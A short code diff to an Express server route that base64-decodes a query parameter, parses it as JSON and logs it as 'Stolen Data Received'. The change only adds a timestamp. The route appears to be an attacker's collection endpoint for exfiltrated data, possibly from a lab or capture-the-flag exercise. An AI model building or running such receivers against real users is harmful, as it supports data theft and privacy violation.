@@ -6,7 +6,7 @@ app.get('/', (req, res) => {
   const data = req.query.d;
   const decodedPayload = atob(data);
   const actualPayload = JSON.parse(decodedPayload);
-  console.log(`Stolen Data Received:`);
+  console.log(`Stolen Data Received at ${new Date().toTimeString()}`);
   console.log(actualPayload);
   res.send();
 });
